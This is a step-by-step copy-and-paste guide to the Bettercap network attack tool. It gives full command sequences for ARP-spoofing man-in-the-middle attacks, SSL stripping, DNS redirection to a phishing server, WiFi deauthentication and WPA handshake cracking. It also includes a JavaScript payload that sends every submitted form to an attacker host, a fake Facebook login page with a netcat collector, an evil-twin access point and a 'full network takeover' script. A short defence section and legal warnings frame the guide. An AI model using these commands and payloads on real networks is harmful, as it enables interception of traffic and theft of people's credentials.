# 🔧 BETTERCAP - Complete Copy & Paste Guide

> **⚠️ LEGAL WARNING**: Only use these tools on networks you own or have explicit written permission to test. Unauthorized access to computer networks is illegal.

## 📋 Table of Contents
1. [Installation](#installation)
2. [Basic Setup](#basic-setup)
3. [Network Reconnaissance](#network-reconnaissance)
4. [ARP Spoofing & MITM](#arp-spoofing--mitm)
5. [DNS Spoofing](#dns-spoofing)
6. [WiFi Attacks](#wifi-attacks)
7. [Credential Harvesting](#credential-harvesting)
8. [Complete Attack Scenarios](#complete-attack-scenarios)

---

## 🔌 Installation

### Debian/Ubuntu/Kali Linux
```bash
# Install dependencies
sudo apt update
sudo apt install -y build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev

# Install bettercap
sudo apt install -y bettercap

# Verify installation
bettercap --version
```

### Arch Linux
```bash
sudo pacman -S bettercap
```

### From Source
```bash
# Install Go (if not installed)
wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin

# Install bettercap
go install github.com/bettercap/bettercap@latest
sudo mv ~/go/bin/bettercap /usr/local/bin/
```

---

## 🚀 Basic Setup

### 1. Start Bettercap (Interactive Mode)
```bash
# Start with default interface
sudo bettercap

# Start with specific interface
sudo bettercap -iface wlan0

# Start with specific interface (ethernet)
sudo bettercap -iface eth0
```

### 2. Basic Commands Inside Bettercap
```bash
# Get help
help

# Show available modules
help modules

# Get help for specific module
help net.probe

# Show current events
events.show

# Clear screen
clear

# Exit
exit
```

---

## 🔍 Network Reconnaissance

### Flow 1: Discover All Devices on Network

**Step 1: Start Bettercap**
```bash
sudo bettercap -iface eth0
```

**Step 2: Inside Bettercap, Run Discovery**
```bash
# Enable network probing
net.probe on

# Wait 30 seconds for discovery
sleep 30

# Show discovered hosts
net.show

# Show with more details
net.show -1
```

**Expected Output:**
```
┌─────────────────────┬───────────────────┬────────────────────────┬─────────────────────────┐
│      IP Address     │    MAC Address    │         Name           │         Vendor          │
├─────────────────────┼───────────────────┼────────────────────────┼─────────────────────────┤
│ 192.168.1.1         │ aa:bb:cc:dd:ee:ff │ gateway.local          │ Cisco Systems           │
│ 192.168.1.50        │ 11:22:33:44:55:66 │ android-phone          │ Samsung Electronics     │
└─────────────────────┴───────────────────┴────────────────────────┴─────────────────────────┘
```

### Flow 2: Monitor Network Traffic
```bash
# Start sniffer
set net.sniff.verbose true
set net.sniff.local true
net.sniff on

# Filter specific traffic (HTTP only)
set net.sniff.filter tcp port 80
net.sniff on

# Stop sniffing
net.sniff off
```

---

## 🎯 ARP Spoofing & MITM

### Flow 3: Man-in-the-Middle Attack (Full Setup)

**Scenario:** Intercept traffic between target (192.168.1.50) and gateway

**Step 1: Start Bettercap**
```bash
sudo bettercap -iface eth0
```

**Step 2: Discover Network**
```bash
net.probe on
sleep 10
net.show
```

**Step 3: Set Target**
```bash
# Set specific target
set arp.spoof.targets 192.168.1.50

# OR target entire subnet (DANGEROUS)
set arp.spoof.targets 192.168.1.0/24
```

**Step 4: Enable Packet Forwarding**
```bash
# This prevents connection drops
set arp.spoof.fullduplex true
```

**Step 5: Start ARP Spoofing**
```bash
arp.spoof on
```

**Step 6: Enable Traffic Sniffing**
```bash
set net.sniff.verbose true
net.sniff on
```

**Step 7: Monitor Traffic**
```bash
# Watch for HTTP requests
events.stream on

# You'll see URLs, cookies, credentials flowing
```

**Step 8: Stop Attack**
```bash
arp.spoof off
net.sniff off
```

### Flow 4: SSL Stripping (Downgrade HTTPS to HTTP)

**Complete Flow:**
```bash
# Start bettercap
sudo bettercap -iface eth0

# Set target
set arp.spoof.targets 192.168.1.50
set arp.spoof.fullduplex true

# Enable SSL stripping
set http.proxy.sslstrip true

# Start HTTP proxy
http.proxy on

# Start ARP spoofing
arp.spoof on

# Start sniffing
set net.sniff.verbose true
net.sniff on

# Now any HTTP traffic will be intercepted
# HTTPS will be attempted to be downgraded
```

---

## 🌐 DNS Spoofing

### Flow 5: Redirect Websites to Fake Server

**Scenario:** Redirect facebook.com to your phishing server at 192.168.1.100

**Step 1: Create DNS Hosts File**
```bash
# On your terminal (not in bettercap)
cat > dns_hosts.txt << 'EOF'
facebook.com 192.168.1.100
*.facebook.com 192.168.1.100
google.com 192.168.1.100
EOF
```

**Step 2: Start Bettercap**
```bash
sudo bettercap -iface eth0
```

**Step 3: Configure DNS Spoofing**
```bash
# Set target
set arp.spoof.targets 192.168.1.50

# Load DNS hosts file
set dns.spoof.hosts /path/to/dns_hosts.txt

# Set domains to spoof
set dns.spoof.domains facebook.com,*.facebook.com,google.com

# Enable all spoofing
dns.spoof on
arp.spoof on
```

**Step 4: Verify**
```bash
# Target will now get your IP when resolving these domains
events.stream on
```

---

## 📡 WiFi Attacks

### Flow 6: WiFi Reconnaissance

**Step 1: Set WiFi Interface to Monitor Mode**
```bash
# Outside bettercap
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Your interface is now wlan0mon
```

**Step 2: Start Bettercap with WiFi**
```bash
sudo bettercap -iface wlan0mon
```

**Step 3: Scan for Networks**
```bash
# Enable WiFi scanning
wifi.recon on

# Wait for networks to appear
sleep 30

# Show discovered networks
wifi.show

# Show with more details
wifi.show -1
```

**Output:**
```
┌──────────────────┬───────────────────┬────────┬─────────┬────────────┬─────────┐
│      BSSID       │       SSID        │  Enc   │ Channel │   Clients  │  Signal │
├──────────────────┼───────────────────┼────────┼─────────┼────────────┼─────────┤
│ AA:BB:CC:DD:EE:FF│ MyWiFiNetwork     │ WPA2   │    6    │     3      │  -45 dB │
└──────────────────┴───────────────────┴────────┴─────────┴────────────┴─────────┘
```

### Flow 7: WiFi Deauth Attack (Disconnect Clients)

**Step 1: Setup**
```bash
# With monitor mode enabled (wlan0mon)
sudo bettercap -iface wlan0mon
```

**Step 2: Find Target Network**
```bash
wifi.recon on
sleep 20
wifi.show
```

**Step 3: Deauth Specific Client**
```bash
# Deauth specific client from specific AP
wifi.deauth AA:BB:CC:DD:EE:FF (AP) 11:22:33:44:55:66 (Client)
```

**Step 4: Deauth All Clients from AP**
```bash
# Disconnect all clients from an access point
wifi.deauth AA:BB:CC:DD:EE:FF
```

### Flow 8: Capture WPA Handshake

**Complete Flow:**
```bash
# Step 1: Start in monitor mode
sudo bettercap -iface wlan0mon

# Step 2: Start reconnaissance
wifi.recon on
sleep 20
wifi.show

# Step 3: Set output file for handshake
set wifi.handshakes.file /tmp/handshakes.pcap

# Step 4: Target specific AP
set wifi.recon.channel 6

# Step 5: Deauth to force handshake
wifi.deauth AA:BB:CC:DD:EE:FF

# Step 6: Wait and check
# Handshake will be saved when captured
# You'll see: [WiFi] WPA handshake captured for SSID

# Step 7: Crack with hashcat
# Exit bettercap, then:
```

**On Terminal:**
```bash
# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 /tmp/handshakes.pcap

# Crack with wordlist
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## 🔐 Credential Harvesting

### Flow 9: Capture HTTP Credentials

**Complete Setup:**
```bash
# Start bettercap
sudo bettercap -iface eth0

# Discovery
net.probe on
sleep 10
net.show

# Target device
set arp.spoof.targets 192.168.1.50
set arp.spoof.fullduplex true

# Enable credential sniffing
set net.sniff.verbose false
set net.sniff.local false
set net.sniff.filter "tcp port 80 or tcp port 443"

# Start modules
arp.spoof on
net.sniff on
http.proxy on

# Enable events to see credentials
events.stream on
```

**You'll see output like:**
```
[http.proxy] [192.168.1.50] POST http://example.com/login
  username=admin&password=secret123
```

### Flow 10: JavaScript Injection

**Inject JavaScript into HTTP Pages:**

**Step 1: Create JS Payload**
```bash
cat > inject.js << 'EOF'
// Alert box example
alert("You've been pwned!");

// Send credentials to your server
document.addEventListener('submit', function(e) {
    var formData = new FormData(e.target);
    fetch('http://192.168.1.100:8080/collect', {
        method: 'POST',
        body: formData
    });
});
EOF
```

**Step 2: Configure Bettercap**
```bash
sudo bettercap -iface eth0

# Set target
set arp.spoof.targets 192.168.1.50

# Load JS injection
set http.proxy.script /path/to/inject.js

# Start
arp.spoof on
http.proxy on
```

---

## 🎬 Complete Attack Scenarios

### Scenario 1: Full Network Takeover

**Goal:** Monitor entire network, capture credentials, redirect traffic

```bash
#!/bin/bash
# Run this script for automated attack

sudo bettercap -iface eth0 -eval "
  # Discovery
  net.probe on;
  sleep 10;

  # Target entire subnet
  set arp.spoof.targets 192.168.1.0/24;
  set arp.spoof.fullduplex true;

  # Enable sniffing
  set net.sniff.verbose true;
  set net.sniff.local false;

  # Enable HTTP proxy and SSL strip
  set http.proxy.sslstrip true;

  # Start all modules
  arp.spoof on;
  http.proxy on;
  net.sniff on;

  # Stream events
  events.stream on;
"
```

### Scenario 2: Targeted Phishing Attack

**Goal:** Redirect target to fake login page

**Step 1: Setup Fake Server**
```bash
# On your machine, create simple phishing page
mkdir /tmp/phishing
cd /tmp/phishing

cat > index.html << 'EOF'
<html>
<body>
<h1>Facebook Login</h1>
<form action="http://192.168.1.100:8080/collect" method="POST">
  Email: <input type="text" name="email"><br>
  Password: <input type="password" name="password"><br>
  <input type="submit" value="Login">
</form>
</body>
</html>
EOF

# Start web server
python3 -m http.server 80
```

**Step 2: Setup Collector**
```bash
# In another terminal
nc -lvnp 8080
```

**Step 3: Run Bettercap**
```bash
# Create DNS hosts
echo "facebook.com 192.168.1.100" > /tmp/dns.txt

# Run bettercap
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets 192.168.1.50;
  set dns.spoof.hosts /tmp/dns.txt;
  set dns.spoof.domains facebook.com;
  arp.spoof on;
  dns.spoof on;
"
```

### Scenario 3: Evil Twin WiFi

**Goal:** Create fake WiFi to capture credentials

```bash
# Step 1: Create fake AP
sudo bettercap -iface wlan0 -eval "
  set wifi.ap.ssid 'Free WiFi';
  set wifi.ap.channel 6;
  wifi.ap
"

# Step 2: In another terminal, setup captive portal
# Users connecting will see your login page
```

---

## 📝 Caplet Files (Automation)

### Create Reusable Caplets

**File: `mitm.cap`**
```bash
# Save this as /usr/share/bettercap/caplets/mitm.cap
net.probe on
sleep 5

set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.0/24

set net.sniff.verbose true
set http.proxy.sslstrip true

arp.spoof on
http.proxy on
net.sniff on

events.stream on
```

**Run caplet:**
```bash
sudo bettercap -iface eth0 -caplet mitm
```

---

## 🛡️ Detection & Defense

### How to Detect Bettercap Attacks

1. **Check ARP table for duplicates:**
```bash
arp -a | sort
```

2. **Monitor for ARP spoofing:**
```bash
sudo arpwatch -i eth0
```

3. **Use static ARP entries:**
```bash
sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
```

4. **Enable port security on switches**
5. **Use HTTPS everywhere**
6. **Monitor DNS requests**

---

## 🔧 Advanced Tips

### Custom Event Filters
```bash
# Only show HTTP POST requests
events.stream on
events.filter events.net.sniff.http.request.post

# Show only specific IP
events.filter events.net.sniff.http.* AND src.ip="192.168.1.50"
```

### Logging to File
```bash
# Start with logging
sudo bettercap -iface eth0 -eval "
  events.stream on;
  events.log /tmp/bettercap.log;
  net.sniff on;
"
```

### REST API
```bash
# Start with API enabled
sudo bettercap -iface eth0 -eval "
  api.rest on;
"

# Access at: http://127.0.0.1:8081
# Username: user
# Password: pass
```

---

## 🆘 Quick Reference

### Most Common Commands
```bash
# Discovery
net.probe on; sleep 10; net.show

# MITM
set arp.spoof.targets <IP>; arp.spoof on; http.proxy on

# WiFi scan
wifi.recon on; wifi.show

# Deauth
wifi.deauth <BSSID>

# DNS spoof
set dns.spoof.domains <domain>; dns.spoof on

# Sniff
net.sniff on
```

---

## ⚠️ Final Warning

These tools are powerful and can cause significant damage if misused. Only use on:
- Your own networks
- Networks you have written permission to test
- Authorized penetration testing engagements
- Educational lab environments

**Unauthorized use is illegal and punishable by law.**

---

## 📚 Additional Resources

- Official Docs: https://www.bettercap.org/
- GitHub: https://github.com/bettercap/bettercap
- Interactive Tutorial: https://www.bettercap.org/intro/
- Caplets Repository: https://github.com/bettercap/caplets

---

**Happy (Legal) Hacking! 🔒**
